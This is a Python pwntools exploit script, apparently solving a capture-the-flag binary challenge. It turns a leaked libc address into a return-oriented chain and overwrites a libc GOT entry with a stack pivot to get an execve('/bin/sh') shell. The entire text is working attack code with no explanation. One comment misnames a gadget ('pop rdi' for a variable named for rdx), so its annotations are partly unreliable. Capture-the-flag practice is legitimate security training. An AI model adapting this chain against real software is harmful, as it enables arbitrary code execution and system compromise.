#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
p = process()
#p = remote('172.31.2.2', 36902)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001388
#           brva 0x00000000000013B7
#           ''')
p.recvuntil(b'Gift : ')
libc.address = int(p.recvline()[:-1],16) - libc.sym.puts
ld.address = libc.address + 0x22b000
log.info(f'ld: {hex(ld.address)}')
log.info(f'libc: {hex(libc.address)}')
log.info(f'system; {hex(libc.sym.system)}')
got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
log.info(f'got: {hex(got)}')

poprsiret = libc.address + 0x2be51 # pop rsi; ret
poprdxret = libc.address + 0x170337 # pop rdi; ret
onegadget = libc.address + 0xebc88 # execve("/bin/sh", rsi, rdx)
    
stackpivot = libc.address + 0x00000000000a0265 # add rsp, 0x58; ret

p.sendafter(b"how the stack works",p64(poprsiret))
p.sendafter(b"how the stack works",p64(poprdxret))
p.sendafter(b"how the stack works",p64(onegadget))

p.recvuntil(b"Show your skills")

input()
p.sendlineafter(b">",hex(got+152))
p.sendlineafter(b">",p64(stackpivot))

p.interactive()
